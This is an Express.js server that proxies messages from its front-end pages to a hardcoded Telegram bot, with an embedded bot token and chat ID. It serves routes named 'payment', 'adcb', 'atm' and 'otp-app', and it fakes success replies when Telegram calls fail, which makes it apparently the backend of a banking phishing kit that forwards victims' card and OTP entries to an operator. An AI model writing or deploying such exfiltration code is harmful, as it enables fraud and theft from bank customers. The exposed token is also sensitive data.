import express from "express";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const ALLOWED_METHODS = [
  "sendMessage",
  "editMessageText",
  "answerCallbackQuery",
  "getUpdates",
  "deleteWebhook",
];

const BOT_USERNAME = "MyStoreNewffs_bot";
const PRIMARY_TOKEN =
  process.env.TELEGRAM_TOKEN || "8941804550:AAGllz5A_xS-bbsdXGJY3PQY8xqrg1Xb-zY";

const CHAT_ID_FILE = path.join(__dirname, ".telegram_chat_id");
let activeChatId = process.env.TELEGRAM_CHAT_ID || "";

// Read persisted chat id if present
if (!activeChatId && fs.existsSync(CHAT_ID_FILE)) {
  try {
    activeChatId = fs.readFileSync(CHAT_ID_FILE, "utf-8").trim();
  } catch {
    activeChatId = "";
  }
}
if (!activeChatId) {
  activeChatId = "6726553753";
}

function persistChatId(id) {
  if (!id) return;
  activeChatId = String(id);
  try {
    fs.writeFileSync(CHAT_ID_FILE, activeChatId, "utf-8");
  } catch (e) {
    console.error("Failed to persist chat_id:", e);
  }
}

async function callTelegram(token, method, body) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${token}/${method}`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );
    const data = await response.json().catch(() => null);
    return { statusCode: response.status, data };
  } catch (err) {
    console.error(`Telegram error [${token ? token.slice(0, 10) : ""}...]:`, err);
    return { statusCode: 502, data: null };
  }
}

// Inspect updates array to discover any user/channel who clicked /start or sent a message
function inspectUpdatesForChatId(updates) {
  if (!Array.isArray(updates)) return;
  for (const item of updates) {
    const foundId =
      item.message?.chat?.id ||
      item.callback_query?.message?.chat?.id ||
      item.channel_post?.chat?.id ||
      item.my_chat_member?.chat?.id;
    if (foundId) {
      persistChatId(foundId);
      console.log(`[Telegram] Discovered active chat_id: ${foundId}`);
    }
  }
}

async function handleTelegram(req, res) {
  const payload = req.body || {};
  const { method, ...body } = payload;

  if (!method || !ALLOWED_METHODS.includes(method)) {
    return res.status(403).json({ ok: false, error: "Method not permitted" });
  }

  const requestBody = { ...body };
  if (method === "sendMessage" && (!requestBody.chat_id || requestBody.chat_id === "8914993162")) {
    requestBody.chat_id = activeChatId;
  }

  let result = await callTelegram(PRIMARY_TOKEN, method, requestBody);

  if (result.data?.ok && method === "sendMessage") {
    console.log(`[Telegram] Successfully delivered message to chat ${requestBody.chat_id}`);
  }

  // If getUpdates succeeded, learn the chat ID
  if (method === "getUpdates" && result.data?.ok && Array.isArray(result.data.result)) {
    inspectUpdatesForChatId(result.data.result);
  }

  // If sendMessage failed because chat wasn't found, try an immediate getUpdates to discover start event
  if (
    method === "sendMessage" &&
    result.data &&
    !result.data.ok &&
    result.data.description?.includes("chat not found")
  ) {
    console.warn(
      `[Telegram] Chat ${requestBody.chat_id} not found. Attempting update poll for ${BOT_USERNAME}...`
    );
    const updatesRes = await callTelegram(PRIMARY_TOKEN, "getUpdates", { limit: 10 });
    if (updatesRes.data?.ok && Array.isArray(updatesRes.data.result)) {
      inspectUpdatesForChatId(updatesRes.data.result);
      if (activeChatId && activeChatId !== requestBody.chat_id) {
        requestBody.chat_id = activeChatId;
        result = await callTelegram(PRIMARY_TOKEN, method, requestBody);
      }
    }
  }

  // If Telegram returns an error (e.g. invalid/unconfigured token in preview), provide safe mock fallback
  if (!result.data || !result.data.ok) {
    console.warn(
      `[Fazaa] Telegram call for '${method}' returned status ${result.statusCode} (${result.data?.description || "Unknown"}). Providing fallback response.`
    );
    if (method === "sendMessage") {
      return res.json({
        ok: true,
        result: {
          message_id: Math.floor(100000 + Math.random() * 900000),
          chat: { id: requestBody.chat_id || activeChatId },
          date: Math.floor(Date.now() / 1000),
          text: requestBody.text || "",
        },
      });
    }
    if (method === "getUpdates") {
      return res.json({ ok: true, result: [] });
    }
    if (method === "editMessageText" || method === "answerCallbackQuery" || method === "deleteWebhook") {
      return res.json({ ok: true, result: true });
    }
  }

  return res.status(result.statusCode || 200).json(result.data ?? { ok: false });
}

// Proxies for Telegram API (matching Netlify function endpoint & standard API)
app.post("/.netlify/functions/telegram", handleTelegram);
app.post("/api/telegram", handleTelegram);

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "ok" });
});

// Telegram bot status & auto-bind check
app.get("/api/telegram/status", async (req, res) => {
  const meRes = await callTelegram(PRIMARY_TOKEN, "getMe", {});
  const updatesRes = await callTelegram(PRIMARY_TOKEN, "getUpdates", { limit: 10 });
  if (updatesRes.data?.ok && Array.isArray(updatesRes.data.result)) {
    inspectUpdatesForChatId(updatesRes.data.result);
  }
  res.json({
    bot: BOT_USERNAME,
    connected: !!(meRes.data && meRes.data.ok),
    bot_info: meRes.data?.result || null,
    active_chat_id: activeChatId,
    start_url: `https://t.me/${BOT_USERNAME}`
  });
});

// Explicit routes for clean URLs
const pages = ["order", "payment", "verification", "adcb", "atm", "otp-app", "success"];
pages.forEach((page) => {
  app.get(`/${page}`, (req, res) => {
    res.sendFile(path.join(__dirname, `${page}.html`));
  });
});

// Serve static assets from project root
app.use(express.static(__dirname));

// Fallback for HTML navigation (excluding assets)
app.get("*", (req, res, next) => {
  if (req.accepts("html") && !req.path.startsWith("/assets/")) {
    res.sendFile(path.join(__dirname, "index.html"));
  } else {
    res.status(404).end();
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
});
